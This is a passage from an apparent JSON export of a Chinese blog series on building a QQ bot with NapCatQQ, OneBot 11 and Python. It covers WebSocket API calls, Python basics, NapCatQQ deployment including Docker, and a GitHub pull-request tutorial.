通信协议为例描述。通过 WebSocket 消息发送的数据全部使用 JSON 格式。\n 具体的文档详情可见：onebot-11&#x2F;communication&#x2F;ws.md at master · botuniverse&#x2F;onebot-11 (github.com)\nAPI 的运用：onebot-11&#x2F;communication&#x2F;ws.md at master · botuniverse&#x2F;onebot-11 (github.com)\n例如利用 API 发送一条私聊消息\n&#123;    &quot;action&quot;: &quot;send_private_msg&quot;,    &quot;params&quot;: &#123;        &quot;user_id&quot;: 10001000,        &quot;message&quot;: &quot;你好&quot;    &#125;,    &quot;echo&quot;: &quot;123&quot;&#125;\n\n连接后向 Onebot 发送此 JSON 消息，就可以实现向 10001000 发送“你好”这条消息，其它参数可以去 Onebot11 文档查看，这里不过多描述，经测试，这里的 user_id 可以是字符串型也可以是整形。\n消息是 OneBot 标准中一个重要的数据类型，在发送消息的 API 和接收消息的事件中都有相关字段。目前消息的格式分为两种：字符串（string）和数组（array）。\nmessage 的值，可以是字符串也可以是数组，具体的文档请看 onebot-11&#x2F;message&#x2F;README.md at master · botuniverse&#x2F;onebot-11 (github.com)\n字符串格式可以包括 CQ 码，例如 [CQ:face,id=178]看看我刚拍的照片[CQ:image,file=123.jpg]\n数组格式请看 onebot-11&#x2F;message&#x2F;array.md at master · botuniverse&#x2F;onebot-11 (github.com)\n消息段是 CQ 码在数组格式中的表示形式，基本格式如下：\n&#123;    &quot;type&quot;: &quot;image&quot;,    &quot;data&quot;: &#123;        &quot;file&quot;: &quot;123.jpg&quot;    &#125;&#125;\n\n如何发 JSON 消息有关于 Onebot11 的 JSON 消息格式文档可以看 onebot-11&#x2F;message&#x2F;segment.md at master · botuniverse&#x2F;onebot-11 (github.com)\n如何发 JSON 消息，就是在用 API 发送消息的基础上，把 message 的值，传入 JSON 就可以\n例如下面 JSON，把这段 JSON 消息传入就可以发送\n&#123;    &quot;type&quot;: &quot;json&quot;,    &quot;data&quot;: &#123;        &quot;data&quot;: &quot;&#123;\\&quot;app\\&quot;: ...&quot;    &#125;&#125;\n\n发 JSON 消息的实践利用 JSON 消息发送推荐群&#x2F;好友卡片\n# 发送群消息async def send_group_msg(websocket, group_id, content):    message = &#123;        &quot;action&quot;: &quot;send_group_msg&quot;,        &quot;params&quot;: &#123;&quot;group_id&quot;: group_id, &quot;message&quot;: content&#125;,    &#125;    await websocket.send(json.dumps(message))    logging.info(f&quot;已发送群消息: &#123;message&#125;&quot;)# 给群分享加群卡片async def send_ArkShareGroupEx_group(websocket, group_id, target_group_id):    try:        message = &#123;            &quot;action&quot;: &quot;ArkShareGroupEx&quot;,            &quot;params&quot;: &#123;&quot;group_id&quot;: str(group_id)&#125;,        &#125;        await websocket.send(json.dumps(message))        response = json.loads(await websocket.recv())        data = response.get(&quot;data&quot;)        await send_json_msg_group(websocket, target_group_id, data)    except Exception as e:        logging.error(f&quot;发送加群卡片失败: &#123;e&#125;&quot;)# 向群发送JSON消息async def send_json_msg_group(websocket, group_id, data):    try:        message = &#123;            &quot;type&quot;: &quot;json&quot;,            &quot;data&quot;: &#123;&quot;data&quot;: data&#125;,        &#125;  # 注意这边两层data，详情可见https://github.com/botuniverse/onebot-11/blob/master/message/segment.md#json-%E6%B6%88%E6%81%AF        await send_group_msg(websocket, group_id, message)    except Exception as e:        logging.error(f&quot;发送JSON消息失败: &#123;e&#125;&quot;)\n\n\n\n\n首先在 send_ArkShareGroupEx_group 函数里提取处 JSON 信息\n在 send_json_msg_group 把 JSON 封装成 message\n在 send_group_msg 通过 API 发出去\n\n这里其实如果是要发 JSON 消息的话，除了数组形式，还有一种方法前面也提到了，就是 CQ 码\n试过了，CQ 码不可以，会被解析成 CQ 码字符串直接发 JSON 源码而不是卡片\n","categories":["QQbot"],"tags":["Python","QQbot","QQ机器人","NapCatQQ"]},{"title":"基于NapCatQQ和Python的QQ机器人开发——Python常用语法","url":"/posts/d5fe3115.html","content":"背景在写机器人的过程中不可避免的碰到语法的学习，本页梳理了常用的语法，以及记录开发机器人以来遇到的各种问题，需要注意的点。。\n函数调用尽可能的分离函数，让某特殊功能的函数单独定义，以便于反复调用\n异常处理每个函数中尽量都要有异常处理，好处一个是方便快速调试报错点，第二个就是不会因为异常导致程序退出。\n更详细的内容可以看 Python 异常处理 | 菜鸟教程 (runoob.com)\ntry:&lt;语句&gt;        #运行别的代码except &lt;名字&gt;：&lt;语句&gt;        #如果在 try 部份  引发了&#x27;name&#x27;异常except &lt;名字&gt;，&lt;数据&gt;:&lt;语句&gt;        #如果引发了&#x27;name&#x27;异常，获得附加的数据else:&lt;语句&gt;        #如果没有异常发生\n\n\n\n\n异常名称\n描述\n\n\n\nBaseException\n所有异常的基类\n\n\nSystemExit\n解释器请求退出\n\n\nKeyboardInterrupt\n用户中断执行(通常是输入^C)\n\n\nException\n常规错误的基类\n\n\nStopIteration\n迭代器没有更多的值\n\n\nGeneratorExit\n生成器(generator)发生异常来通知退出\n\n\nStandardError\n所有的内建标准异常的基类\n\n\nArithmeticError\n所有数值计算错误的基类\n\n\nFloatingPointError\n浮点计算错误\n\n\nOverflowError\n数值运算超出最大限制\n\n\nZeroDivisionError\n除(或取模)零 (所有数据类型)\n\n\nAssertionError\n断言语句失败\n\n\nAttributeError\n对象没有这个属性\n\n\nEOFError\n没有内建输入, 到达 EOF 标记\n\n\nEnvironmentError\n操作系统错误的基类\n\n\nIOError\n输入&#x2F;输出操作失败\n\n\nOSError\n操作系统错误\n\n\nWindowsError\n系统调用失败\n\n\nImportError\n导入模块&#x2F;对象失败\n\n\nLookupError\n无效数据查询的基类\n\n\nIndexError\n序列中没有此索引(index)\n\n\nKeyError\n映射中没有这个键\n\n\nMemoryError\n内存溢出错误(对于 Python 解释器不是致命的)\n\n\nNameError\n未声明&#x2F;初始化对象 (没有属性)\n\n\nUnboundLocalError\n访问未初始化的本地变量\n\n\nReferenceError\n弱引用(Weak reference)试图访问已经垃圾回收了的对象\n\n\nRuntimeError\n一般的运行时错误\n\n\nNotImplementedError\n尚未实现的方法\n\n\nSyntaxError\nPython 语法错误\n\n\nIndentationError\n缩进错误\n\n\nTabError\nTab 和空格混用\n\n\nSystemError\n一般的解释器系统错误\n\n\nTypeError\n对类型无效的操作\n\n\nValueError\n传入无效的参数\n\n\nUnicodeError\nUnicode 相关的错误\n\n\nUnicodeDecodeError\nUnicode 解码时的错误\n\n\nUnicodeEncodeError\nUnicode 编码时错误\n\n\nUnicodeTranslateError\nUnicode 转换时错误\n\n\nWarning\n警告的基类\n\n\nDeprecationWarning\n关于被弃用的特征的警告\n\n\nFutureWarning\n关于构造将来语义会有改变的警告\n\n\nOverflowWarning\n旧的关于自动提升为长整型(long)的警告\n\n\nPendingDeprecationWarning\n关于特性将会被废弃的警告\n\n\nRuntimeWarning\n可疑的运行时行为(runtime behavior)的警告\n\n\nSyntaxWarning\n可疑的语法的警告\n\n\nUserWarning\n用户代码生成的警告\n\n\n文件读写专有名词叫做 Python File(文件) 方法\nopen() 方法完整的语法格式为：\nopen(file, mode=&#x27;r&#x27;, buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None)\n\n参数说明:\n\nfile: 必需，文件路径（相对或者绝对路径）。\nmode: 可选，文件打开模式\nbuffering: 设置缓冲\nencoding: 一般使用 utf8\nerrors: 报错级别\nnewline: 区分换行符\nclosefd: 传入的 file 参数类型\nopener: 设置自定义开启器，开启器的返回值必须是一个打开的文件描述符。\n\n\n\n\n模式\n描述\n\n\n\nt\n文本模式 (默认)。\n\n\nx\n写模式，新建一个文件，如果该文件已存在则会报错。\n\n\nb\n二进制模式。\n\n\n+\n打开一个文件进行更新(可读可写)。\n\n\nU\n通用换行模式（不推荐）。\n\n\nr\n以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。\n\n\nrb\n以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。\n\n\nr+\n打开一个文件用于读写。文件指针将会放在文件的开头。\n\n\nrb+\n以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。\n\n\nw\n打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。\n\n\nwb\n以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。\n\n\nw+\n打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。\n\n\nwb+\n以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。\n\n\na\n打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。\n\n\nab\n以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。\n\n\na+\n打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。\n\n\nab+\n以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。\n\n\nfile 对象file 对象使用 open 函数来创建，下表列出了 file 对象常用的函数：\n\n\n\n序号\n方法及描述\n\n\n\n1\nfile.close() 关闭文件。关闭后文件不能再进行读写操作。\n\n\n2\nfile.flush() 刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件, 而不是被动的等待输出缓冲区写入。\n\n\n3\nfile.fileno() 返回一个整型的文件描述符(file descriptor FD 整型), 可以用在如 os 模块的 read 方法等一些底层操作上。\n\n\n4\nfile.isatty() 如果文件连接到一个终端设备返回 True，否则返回 False。\n\n\n5\nfile.next() 返回文件下一行。\n\n\n6\n[file.read(size]) 从文件读取指定的字节数，如果未给定或为负则读取所有。\n\n\n7\n[file.readline(size]) 读取整行，包括 “\\n” 字符。\n\n\n8\n[file.readlines(sizeint]) 读取所有行并返回列表，若给定 sizeint &gt; 0，则是设置一次读多少字节，这是为了减轻读取压力。\n\n\n9\n[file.seek(offset, whence]) 设置文件当前位置\n\n\n10\nfile.tell() 返回文件当前位置。\n\n\n11\n[file.truncate(size]) 截取文件，截取的字节通过 size 指定，默认为当前文件位置。\n\n\n12\nfile.write(str) 将字符串写入文件，返回的是写入的字符长度。\n\n\n13\nfile.writelines(sequence) 向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。\n\n\n函数处理函数阻断在执行过程中，不免要进行一些函数阻断，以防满足两个条件，导致运行两次。\n在要执行的函数下面写个 return，就可以阻断函数继续执行。\n函数异步\n我曾经想用 create_task 实现并发处理，不然的话同一时刻只能处理一条命令，如果出现 API 请求等耗时较长的，会占用时间导致其他命令无法被执行。\n但是失败了，使用 create_task 之后会出现多个接收端，导致接收报错。\n最终得出的结论是，没必要使用，本地处理几乎都是毫秒级的，就算是 API 请求，网络畅通的情况下也很快（大模型等需要思考的 API 请求除外）\n\n函数异步可以用 async 和 await 来实现，async 用于定义一个异步函数，await 用于等待一个异步函数执行完成。\n当然如果你想让函数并发，那么可以使用 asyncio 模块来实现，asyncio 模块提供了一些函数来实现异步编程。\n下面是一个具体例子\nasync def Example_main(websocket, msg):    # 确保数据目录存在    os.makedirs(DATA_DIR, exist_ok=True)    # 并发执行任务    await asyncio.gather(        handle_Example_group_message(websocket, msg),        handle_Example_group_notice(websocket, msg),        handle_Example_private_message(websocket, msg),    )\n\n变量的使用规范数据类型例如在获取群号的时候，通常涉及到数据存储，为了方便做处理，一般以 str 类型保存群号，因为 msg 参数给出的是 int 类型，需要注意转换一下\n2024 年 8 月 21 日，补充一句，不要一般了，获取到群号或 QQ 号一定要先转换成字符串，要不然后患无穷（不然就像我一样，JSON 字典存储数据，因为一个 str 和 int 数据类型不一致导致的 bug，找了三个小时才找到）\n数据的存储和交互JSON在机器人的开发过程中，不可避免的会遇到数据存储的问题，通常会使用 json 文件进行存储，在 Python 中，可以使用 json 模块来处理 JSON 数据。\n并且不免要进行数据的交互，比如从数据库中获取数据，或者将数据存储到本地，或者从本地获取数据，我习惯使用 json 文件进行存储，因为比较简单，并且容易理解。如果你知道如何使用数据库，那么你可以使用数据库进行存储，这样会更加安全可靠。\n在数据交互的开发过程中，通常会先读取本地文件，然后进行数据处理，最后将数据存储到本地文件中，如此反复。\n可能这个过程看起来比较繁琐耗时间，但实际上这个过程的处理几乎是毫秒级的，所以不用担心时间问题。\n数据库（SQLite）JSON 只适合一些数据量小，而且简单，读写频率低的数据存储，如果数据量比较大，或者需要进行复杂的数据处理，那么可以使用数据库进行存储。\n并且 JSON 在读写的时候容易出现数据丢失，所以不建议使用 JSON 进行大量的数据存储。\n数据的匹配（正则表达式）在机器人的开发过程中，不免会遇到数据的匹配问题，比如检测是否是某个群，或者检测是否是某个 QQ 号，或者检测是否是某个关键词等。\n可以使用正则表达式来实现数据的匹配，正则表达式是一种强大的文本处理工具，可以用来匹配、查找、替换和分割文本。\n正则表达式相关知识点，可以看 Python 正则表达式教程\n这个正则表达式示例可以一看\n正则表达式实例字符匹配\n\n\n实例\n描述\n\n\n\npython\n匹配 “python”.\n\n\n字符类\n\n\n实例\n描述\n\n\n\n[Pp] ython\n匹配 “Python” 或 “python”\n\n\nrub [ye]\n匹配 “ruby” 或 “rube”\n\n\n[aeiou]\n匹配中括号内的任意一个字母\n\n\n[0-9]\n匹配任何数字。类似于 [0123456789]\n\n\n[a-z]\n匹配任何小写字母\n\n\n[A-Z]\n匹配任何大写字母\n\n\n[a-zA-Z0-9]\n匹配任何字母及数字\n\n\n[^aeiou]\n除了 aeiou 字母以外的所有字符\n\n\n[^0-9]\n匹配除了数字外的字符\n\n\n特殊字符类\n\n\n实例\n描述\n\n\n\n.\n匹配除 “\\n” 之外的任何单个字符。要匹配包括 ‘\\n’ 在内的任何字符，请使用象 ‘[.\\n]’ 的模式。\n\n\n\\d\n匹配一个数字字符。等价于 [0-9]。\n\n\n\\D\n匹配一个非数字字符。等价于 [^0-9]。\n\n\n\\s\n匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \\f\\n\\r\\t\\v]。\n\n\n\\S\n匹配任何非空白字符。等价于 [^ \\f\\n\\r\\t\\v]。\n\n\n\\w\n匹配包括下划线的任何单词字符。等价于’[A-Za-z0-9_]’。\n\n\n\\W\n匹配任何非单词字符。等价于 ‘[^A-Za-z0-9_]’。\n\n\n常用函数或库日期的处理在 Python 中，可以使用 datetime 模块来处理日期，datetime 模块提供了一些函数来处理日期。用 datetime.now() 获取当前时间，用 datetime.now().strftime(&#39;%Y-%m-%d %H:%M:%S&#39;) 获取当前时间的字符串格式。\n此方法可以用在检测日期或时间是否满足某个条件，比如检测是否是某个时间点，或者检测是否是某个时间段。实现 定时任务等功能\nPython 日期和时间教程\n更方便的定时任务可以使用 schedule 模块，schedule 模块提供了一些函数来处理定时任务。\n","categories":["QQbot"],"tags":["Python","QQbot","QQ机器人","NapCatQQ"]},{"title":"基于NapCatQQ和Python的QQ机器人开发——对websocket响应消息的分离处理","url":"/posts/8b45af9c.html","content":"\n  \n    本文已过时，请参考最新文章：基于 NapCatQQ 和 Python 的 QQ 机器人开发 —— 对 websocket 响应消息的回应处理 2025.1.25本文已过时，请参考最新文章：基于 NapCatQQ 和 Python 的 QQ 机器人开发 —— 对 websocket 响应消息的回应处理 2025.1.25本文已过时，请参考最新文章：基于 NapCatQQ 和 Python 的 QQ 机器人开发 —— 对 websocket 响应消息的回应处理 2025.1.25本文已过时，请参考最新文章：基于 NapCatQQ 和 Python 的 QQ 机器人开发 —— 对 websocket 响应消息的回应处理 2025.1.25本文已过时，请参考最新文章：基于 NapCatQQ 和 Python 的 QQ 机器人开发 —— 对 websocket 响应消息的回应处理 2025.1.25本文已过时，请参考最新文章：基于 NapCatQQ 和 Python 的 QQ 机器人开发 —— 对 websocket 响应消息的回应处理 2025.1.25\n\n  \n\n前言一直以来 websocket 相应消息的接收都是有问题，之前想过很多办法，包括设置 sleep 等待，设置标志等的来分离 recv 来处理正确的响应，但是始终都没成功，这次改变了一下思路成功了\n修改前发送群消息并获取消息 IDasync def send_group_msg_with_reply(websocket, group_id, content):    try:        message = &#123;            &quot;action&quot;: &quot;send_group_msg&quot;,            &quot;params&quot;: &#123;&quot;group_id&quot;: group_id, &quot;message&quot;: content&#125;,        &#125;        await websocket.send(json.dumps(message))        response = json.loads(await websocket.recv())        message_id = response.get(&quot;data&quot;, &#123;&#125;).get(&quot;message_id&quot;)        logging.info(            f&quot;[API]已发送群消息: &#123;content&#125; 到群 &#123;group_id&#125;，消息ID: &#123;message_id&#125;&quot;        )        return message_id    except Exception as e:        logging.error(f&quot;[API]发送群消息（带回复）失败: &#123;e&#125;&quot;)        return None\n\n例如这个发送群消息并获取消息 ID 的函数，一开始消息处理的速度很快，几乎是毫秒级回应，所以一直没怎么处理，也不影响正常运行\n今天在扩展违禁词监控的时候，新增了一个触发违禁词之后检查之后的聊天记录，如果发现有违规者发送了视频，就直接撤回。\n修改后发送群消息并获取消息 IDasync def send_group_msg_with_reply(websocket, group_id, content):    try:        message = &#123;            &quot;action&quot;: &quot;send_group_msg&quot;,            &quot;params&quot;: &#123;&quot;group_id&quot;: group_id, &quot;message&quot;: content&#125;,            &quot;echo&quot;: &quot;send_group_msg_with_reply&quot;,        &#125;        await websocket.send(json.dumps(message))        while True:            response = await websocket.recv()            response_data = json.loads(response)            if response_data.get(&quot;echo&quot;) == &quot;send_group_msg_with_reply&quot;:                message_id = response_data.get(&quot;data&quot;, &#123;&#125;).get(&quot;message_id&quot;)                logging.info(f&quot;[API]已发送群消息到群 &#123;group_id&#125;，消息ID: &#123;message_id&#125;&quot;)                return message_id    except Exception as e:        logging.error(f&quot;[API]发送群消息（带回复）失败: &#123;e&#125;&quot;)        return None\n\n修改后的函数添加了循环遍历，并使用 ob11 提供的 echo 字段来做标记。\n这样就可以循环遍历，通过遍历收到的消息中符合 echo 对应的消息，就可以摘出想要的回应消息，以便于信息的处理\n","categories":["QQbot"],"tags":["Python","QQbot","QQ机器人","NapCatQQ"]},{"title":"基于NapCatQQ和Python的QQ机器人开发——对websocket响应消息的回应处理2025.1.25","url":"/posts/1ef8783.html","content":"前言在之前 基于 NapCatQQ 和 Python 的 QQ 机器人开发——对 websocket 响应消息的分离处理 | W1ndys 小屋 的教程中提到对于 websocket 的回复捕获作处理获取返回值，后来随着开发和使用，出现了多线程的需求，而开启多线程之后会导致 websocket 返回的时候无法判断传给哪个线程，就会报错。\n解决办法在示例模块中 W1ndysBot&#x2F;Example: W1ndysBot 的功能模块编写示例文件\n已经做了处理，引入了新的回应事件处理函数，例如 W1ndysBot&#x2F;app&#x2F;handler_events.py at main · W1ndysBot&#x2F;W1ndysBot\n# 回应事件处理函数async def handle_Example_response_message(websocket, message):    try:        msg = json.loads(message)        if msg.get(&quot;status&quot;) == &quot;ok&quot;:            echo = msg.get(&quot;echo&quot;)            if echo and echo.startswith(&quot;xxx&quot;):                pass    except Exception as e:        logging.error(f&quot;处理Example回应事件时发生错误: &#123;e&#125;&quot;)\n\n该函数会被消息处理模块调用，再加一些 if 条件判断，从而只会处理返回的 JSON 消息，可以通过设置一些全局变量来暂存数据，实现延迟撤回等操作，例如 QFNUClassRegistrationCheck&#x2F;main.py at main · W1ndysBot&#x2F;QFNUClassRegistrationCheck 中，就通过暂存变量实现了延迟撤（可能未开源）\n","categories":["QQbot"],"tags":["Python","QQbot","QQ机器人","NapCatQQ"]},{"title":"基于NapCatQQ和Python的QQ机器人开发——模块引用中环境变量的学习","url":"/posts/55d6cfbc.html","content":"先看一个例子\n假设文件结构如下\nproject/│├── app/│   ├── scripts/│   │   ├── GroupManager/│   │   │   ├── main.py│   │   │   ├── banned_words.py│   │   │   ├── group_status.py│   │   │   ├── invite_chain.py│   │   │   ├── welcome_farewell.py│   │   │   ├── group_management.py│   ├── api/│   ├── config.py\n\n代码如下\n# app/scripts/GroupManager/main.pyimport loggingimport reimport osimport syssys.path.append(    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))from app.scripts.GroupManager.banned_words import *from app.scripts.GroupManager.group_status import *from app.scripts.GroupManager.invite_chain import *from app.scripts.GroupManager.welcome_farewell import *from app.scripts.GroupManager.group_management import *from app.api import *from app.config import owner_idDATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), &quot;data&quot;)\n\n解释一下下面这段代码\nsys.path.append(    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))\n\n这段代码的作用是将一个目录路径添加到 Python 的模块搜索路径中。具体来说，它通过多次调用os.path.dirname函数，逐级向上查找目录，最终找到项目的根目录，并将其添加到sys.path中。这样，Python 在导入模块时，就可以从这个根目录开始搜索，从而找到项目中的模块。\n在这里是首先获取当前文件的绝对路径，然后获取其上级目录，再获取上级目录，最后获取上级目录，然后将这个目录添加到 Python 的模块搜索路径中。获取了三层路径，最后把路径project/app添加到 sys.path 中。如此就可以通过绝对路径导入模块。例如from app.scripts.GroupManager.banned_words import *\n下面再解释一下下面的代码\nDATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), &quot;data&quot;)\n\n这里是获取当前文件的绝对路径，然后获取其上级目录，然后将data目录添加到这个路径中，然后赋值给DATA_DIR。\n","categories":["QQbot"],"tags":["Python","QQbot","QQ机器人","NapCatQQ"]},{"title":"基于NapCatQQ和Python的QQ机器人开发——连接NapCatQQ和W1ndysBot","url":"/posts/cdcbc710.html","content":"部署 NapCatQQWindows 安装\n  \n    下面是无头非绿色版本，你也可以选择 NapCatQQ 的无头绿色版本，内置 QQ，不需要下载 QQ 本体，直接下载框架即可。由于绿色版开袋即用，启动就是登录，与非绿色版唯一的区别就是启动文件名字不同，绿色版的启动文件名字是 napcat.bat，非绿色版的启动文件名字是 launcher***.bat，这里不详细介绍。\n\n  \n\n下载 QQ 本体直接去 QQ 官网下载 QQ 本体，必须是 NT 的新版 QQ\n下载地址 QQ-轻松做自己\n安装框架去 NapCatQQ 的 release 页下载 框架下载地址\n下载之后解压看到下面一些文件\n\n根据你的电脑系统选择启动脚本\n\n确保 QQ 版本安装且最新\n双击目录下 launcher.bat 即可启动 如果是 win10 则使用 launcher-win10.bat\n\n登录运行上面所属文件之后，你将看到如下界面，你有两种方法进行登录，推荐第一种\n\n\n如果你使用的绿色版本，则启动就会直接到这一步\n\n登录方法一上方红框里有两个链接，复制到浏览器里\n点击扫码登录\n\n手机 QQ 进行扫码登录\n登录成功后将会进入首页\n登录方法二直接扫描控制台里的二维码（但由于不同电脑字符不一样，有的电脑显示的二维码可能不能扫，在上方图片下面的红框里，有一个地址和一个路径，把地址转换为二维码扫描或直接打开路径的二维码文件都可以获取到可以扫的二维码）\n这种方法也可以登录，但由于后续步骤还需要打开方法一的链接，所以不推荐这种登录方法\n配置协议连接在上面的网页里登录成功后将看到下面内容\n\n点击左侧网络配置-新建-websocket 服务器，按照下面进行配置\n开关打开，名称随便写（不能空着），port 改成 3001，心跳间隔改成 60000，其他设置默认即可，确认\n\n开启之后可以看到类似下面内容\n\n01-25 13:02:25 [info] 卷卷测试服 | [Notice] [OneBot11] 配置变更后:[network] 配置加载WebSocket 服务: 0.0.0.0:3001, : 已启动\n\ndocker 安装\n我是比较喜欢 docker 的，因为我平时用都会在 linux 服务器上运行，docker 会更方便一些\n\ndocker 部署命令，W1ndysBot 有大量的我写好的 docker 运行脚本，可以直接参考着使用\nW1ndysBot&#x2F;linux_run_napcat_docker.sh at main · W1ndysBot&#x2F;W1ndysBot\n还有更新镜像的 shell 脚本：W1ndysBot&#x2F;linux_update_napcat.sh at main · W1ndysBot&#x2F;W1ndysBot\n# 启动 Docker 容器docker run -d \\  --rm \\  --network host \\  -e NAPCAT_GID=$NAPCAT_GID \\  -e NAPCAT_UID=$NAPCAT_UID \\  -p 3000:3000 \\  -p 3001:3001 \\  -p 6099:6099 \\  --name napcat \\  --restart=always \\  -v ./napcat/app/.config/QQ:/app/.config/QQ \\  -v ./napcat/app/napcat:/app/napcat \\  mlikiowa/napcat-docker\n\n拉完镜像剩下的就跟前面步骤一模一样了\n\n其他的我就不多说了，你都会用 docker 了，其他还有什么错误是解决不了的\n\n部署处理程序W1ndysBot 开源地址 W1ndysBot&#x2F;W1ndysBot: 基于 NapCatQQ 和 Python 的 QQ 机器人实现\n解压程序到本地解压之后看到下面文件\n\n这里部署好了虚拟环境，可以直接运行，如果你有 Python 基础，也可以自己改环境运行，但不推荐\n运行程序已经写好了批处理脚本\n双击 run_app.bat 即可运行\n连接成功后即可看到如下界面\n\n\n看到这里说明已经部署好环境，下面开始修改配置\n\n配置数据进入目录，找到配置文件 app/config.py\n可以用专用的编辑器打开，也可以用记事本打开\n注意！！！配置好之后，需要重启程序，否则配置不会生效\n# config.pyowner_id = [&quot;&lt;your_owner_id&gt;&quot;]  # 机器人 root 管理员 QQ 号，可以多个，多个用逗号分隔，例如：owner_id = [&quot;123456&quot;, &quot;123457&quot;]，注意！！！这个是 QQ 号不是机器人的QQ号，是你控制机器人用的大号report_group_id = &quot;&lt;your_report_group_id&gt;&quot;  # 上报群# ws_url = &quot;ws://127.0.0.1:8081&quot;  # 本地环境的 WebSocket API 地址ws_url = &quot;ws://127.0.0.1:3001&quot;  # 本地环境的 WebSocket API 地址token = None  # 如果需要认证，请填写认证 token\n\n修改上面配置，下面是一个修改好的例子\n# config.pyowner_id = [&quot;123456&quot;]  # 机器人root管理员 QQ 号report_group_id = &quot;123456&quot;  # 上报群# ws_url = &quot;ws://127.0.0.1:8081&quot;  # 本地环境的 WebSocket API 地址ws_url = &quot;ws://127.0.0.1:3001&quot;  # 本地环境的 WebSocket API 地址token = None  # 如果需要认证，请填写认证 token\n\nowner_id 是机器人 root 管理员 QQ 号\nreport_group_id 是上报群\nws_url 是 WebSocket API 地址\ntoken 是认证 token\n后面两个配置取决于前面的配置，一般不需要改\n","categories":["QQbot"],"tags":["Python","QQbot","QQ机器人","NapCatQQ"]},{"title":"基于NapCatQQ和Python的QQ机器人开发——邀请链递归查询","url":"/posts/b02c5703.html","content":"","categories":["QQbot"],"tags":["Python","QQbot","QQ机器人","NapCatQQ"]},{"title":"基于NapCatQQ和Python的QQ机器人开发——（NapCatQQ）猫猫的传参特性","url":"/posts/78b17ba9.html","content":"前言写群发功能的时候，发现猫猫的传参特性，特此记录。\n事情的起因是，我写了一个群发功能，然后发现，发送的时候会从数据库读取群号，然后发送。读取到的群号是元组，然后我需要发送的群号是字符串，理论上来说，元组应该需要先转换成字符串，然后发送。\n但是，我测试的时候，发现，如果我传入的是元组，猫猫会自动帮我转换成字符串，然后发送。\n猫猫的传参特性实测发现，猫猫的传参特性是，如果传入的参数是元组，那么猫猫会自动帮你转换成列表，然后发送。\n一开始我还以为是 Python 的特性，后来发现并不是，而是猫猫的特性。\n后来在群里问大佬，Z佬说猫猫的传参特性主要是可迭代对象就能转化发送。\n测试代码在发消息的 API 中，群号传入一个元组，然后猫猫会自动帮你转换成列表，然后发送。\nawait websocket.send(    json.dumps(        &#123;            &quot;action&quot;: &quot;send_group_msg&quot;,            &quot;params&quot;: &#123;&quot;group_id&quot;: group_id, &quot;message&quot;: content&#125;,        &#125;    )\n\n这里传入的是一个元组，然后猫猫会转换成列表，然后发送。\n例如传入的是(&quot;10001&quot;,)，那么猫猫会转换成[&quot;10001&quot;]，然后发送。\n总结猫猫的传参特性是，如果传入的参数是元组，那么猫猫会自动帮你转换成列表，然后发送。\n","categories":["QQbot"],"tags":["Python","QQbot","QQ机器人","NapCatQQ"]},{"title":"如何使用Pull Request交付代码","url":"/posts/c011cf82.html","content":"如何使用 Pull Request 交付代码前排提醒国内环境对 Github 的连接稳定性比较差，能否连上比较看运气，推荐开魔法进行连接\n可自行使用 watt toolkit（免费） 进行加速或使用 机场（付费）\n准备工作\n这里以 W1ndys&#x2F;QFNUCyberWiki: QFNUCyberWiki 为例，放在其他仓库或以后工作，自己写项目，参与项目都适用\n\n进入目标页面fork 仓库\n\n选择一个 owner（所有者），仓库名称和描述默认即可，也可以自定义，点击 create fork 进行创建\n\n稍等片刻将会创建一个 fork 副本\n\n\n同步仓库很多时候，主仓库一般会有我们 fork 之后的推送内容，这时候需要先同步一下主仓库的提交记录，才能进行修改，否则容易导致代码冲突，造成比较麻烦的后果\n点击 sync fork 之后会出现一个下拉菜单，点击绿色的更新分支按钮即可同步仓库\n注意：此处更新分支，如果本地修改内容和原来的内容无合并冲突的话是无任何提醒的，如果合并失败，则需要放弃你的本地修改，同步为主仓库的提交记录，为了避免数据丢失，请一定要备份好你的修改内容，便于后面同步后的修改\n\n修改内容\n这里以修改 README 文件为例讲解，修改其他文件同理\n\n进入到目标文件的页面，点编辑按钮进行编辑，如果需要进行大批量操作或借助其它工具可以下载到本地编辑，编辑好之后再复制到这里进行修改\n\n下面进行修改内容\n\n修改完内容之后，点击右上角绿色按钮（commit changes）（此处使用快捷键 Ctrl+S 具有同样的效果）\n\n他会让你填写一些内容\n上面是你的提交信息，用于说明你修改了什么\n下面是额外的描述，用于详细说明修改了什么，如果修改内容较少，此处可以省略不填\n填完之后再次点击绿色按钮进行保存\n\n如下图已保存成功\n\n进行 Pull Request经过上面操作之后，我们已经把我们自己 fork 的内容进行了修改，下面进行提交 Pull Request，即把我们修改的内容发给仓库所有者，让所有者进行合并代码\n点击 contribute，点击 open Pull Request 打开拉取请求\n\n接下来将填写修改的内容，和之前的修改内容一样，上面是修改了什么，下面是详细的描述，这么写的目的是告诉仓库的所有者你做了什么修改，title 必填，描述选填，填完之后点击下方绿色的按钮创建一个 Pull 